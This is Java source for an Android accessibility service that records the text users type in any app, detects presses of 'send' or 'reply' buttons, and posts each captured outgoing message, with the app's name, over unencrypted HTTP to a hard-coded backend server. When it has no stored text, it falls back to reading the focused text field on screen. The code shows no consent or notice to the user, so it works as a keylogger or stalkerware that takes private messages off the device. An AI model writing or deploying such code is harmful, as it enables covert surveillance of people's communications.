package com.example.notifymonitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.pm.PackageManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.JsonObject;

import java.io.IOException;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * AccessibilityService that observes text changes and click events,
 * heuristically detects "send" button presses and sends the last typed text.
 */
public class OutgoingAccessibilityService extends AccessibilityService {
    private static final String TAG = "OutgoingAccessibility";

    // TODO: Change this to your backend API URL
    private static final String API_URL = "http://192.168.29.175:8000/api/notifications";

    private final OkHttpClient client = new OkHttpClient();

    // Last typed text per package name (thread-safe)
    private final Map<String, String> lastTyped = new ConcurrentHashMap<>();

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        // Listen for text changes, clicks, and window content changes
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_CLICKED
                | AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 50;
        setServiceInfo(info);

        Log.d(TAG, "Accessibility service connected.");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String pkg = (event.getPackageName() != null) ? event.getPackageName().toString() : "unknown";

        try {
            int type = event.getEventType();

            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                // Save last text typed into EditText-like nodes
                CharSequence text = event.getText() != null && event.getText().size() > 0 ? event.getText().get(0) : null;
                if (!TextUtils.isEmpty(text)) {
                    lastTyped.put(pkg, text.toString().trim());
                    Log.d(TAG, "TextChanged [" + pkg + "]: " + text);
                }
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                AccessibilityNodeInfo source = event.getSource();
                if (source == null) return;

                // Detect if clicked view looks like a send button
                boolean looksLikeSend = isSendButton(source);

                if (looksLikeSend) {
                    String message = lastTyped.get(pkg);
                    if (!TextUtils.isEmpty(message)) {
                        Log.d(TAG, "Detected send for [" + pkg + "]: " + message);

                        JsonObject json = buildPayloadForOutgoing(pkg, message);
                        postJsonToServer(json.toString());

                        // Clear saved message to avoid duplicates
                        lastTyped.remove(pkg);
                    } else {
                        Log.d(TAG, "Send clicked but no last typed text found for " + pkg);

                        // Fallback: try to find text from focused EditText on screen
                        String screenText = findEditTextText();
                        if (!TextUtils.isEmpty(screenText)) {
                            JsonObject json = buildPayloadForOutgoing(pkg, screenText);
                            postJsonToServer(json.toString());
                        }
                    }
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "Error in accessibility event: " + t.getMessage(), t);
        }
    }

    /**
     * Heuristic to check if a node looks like a "send" button.
     */
    private boolean isSendButton(AccessibilityNodeInfo source) {
        if (source == null) return false;

        CharSequence viewId = source.getViewIdResourceName();
        CharSequence desc = source.getContentDescription();
        CharSequence txt = source.getText();
        CharSequence className = source.getClassName();

        if (viewId != null) {
            String id = viewId.toString().toLowerCase();
            if (id.contains("send") || id.contains("btn_send") || id.contains("reply") || id.contains("compose_send")) {
                return true;
            }
        }

        if (desc != null) {
            String d = desc.toString().toLowerCase();
            if (d.contains("send") || d.contains("reply")) return true;
        }

        if (txt != null) {
            String t = txt.toString().toLowerCase();
            if (t.contains("send") || t.contains("reply")) return true;
        }

        if (className != null && className.toString().toLowerCase().contains("imagebutton")) {
            // check id/desc/text again for image buttons
            if ((viewId != null && viewId.toString().toLowerCase().contains("send"))
                    || (desc != null && desc.toString().toLowerCase().contains("send"))) {
                return true;
            }
        }

        return false;
    }

    /**
     * Build JSON payload to send outgoing message info to backend.
     */
    private JsonObject buildPayloadForOutgoing(String packageName, String message) {
        JsonObject json = new JsonObject();
        json.addProperty("app_identifier", packageName);
        json.addProperty("app_name", getAppLabel(packageName));
        json.addProperty("message", message);
        json.addProperty("message_type", "text");
        json.addProperty("is_read", false);
        json.addProperty("is_deleted", false);
        json.addProperty("is_outgoing", true);

        JsonObject raw = new JsonObject();
        raw.addProperty("detected_by", "accessibility");
        raw.addProperty("timestamp", System.currentTimeMillis());
        json.add("raw_payload", raw);

        return json;
    }

    /**
     * Get application label (human-readable app name).
     */
    private String getAppLabel(String packageName) {
        try {
            PackageManager pm = getPackageManager();
            return pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString();
        } catch (PackageManager.NameNotFoundException e) {
            return packageName;
        }
    }

    /**
     * Fallback: Traverse windows to find currently focused EditText and get its text.
     */
    private String findEditTextText() {
        try {
            for (int i = 0; i < getWindows().size(); i++) {
                AccessibilityNodeInfo root = getWindows().get(i).getRoot();
                if (root == null) continue;
                AccessibilityNodeInfo edit = findFocusedEditText(root);
                if (edit != null && edit.getText() != null) {
                    return edit.getText().toString();
                }
            }
        } catch (Throwable t) {
            Log.e(TAG, "findEditTextText error: " + t.getMessage(), t);
        }
        return null;
    }

    /**
     * Recursively search a node and its children for a focused EditText.
     */
    private AccessibilityNodeInfo findFocusedEditText(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if ("android.widget.EditText".contentEquals(root.getClassName()) && root.isFocused()) {
            return root;
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            AccessibilityNodeInfo res = findFocusedEditText(child);
            if (res != null) return res;
        }
        return null;
    }

    /**
     * Send JSON payload to backend server asynchronously.
     */
    private void postJsonToServer(String jsonBody) {
        MediaType JSON = MediaType.get("application/json; charset=utf-8");
        RequestBody body = RequestBody.create(jsonBody, JSON);
        Request request = new Request.Builder()
                .url(API_URL)
                .post(body)
                .build();

        new Thread(() -> {
            try (Response response = client.newCall(request).execute()) {
                String resp = response.body() != null ? response.body().string() : "empty";
                Log.d(TAG, "POST result code=" + response.code() + " body=" + resp);
            } catch (IOException e) {
                Log.e(TAG, "Failed to POST outgoing message: " + e.getMessage(), e);
            }
        }).start();
    }

    @Override
    public void onInterrupt() {
        // Required override, no-op
    }
}
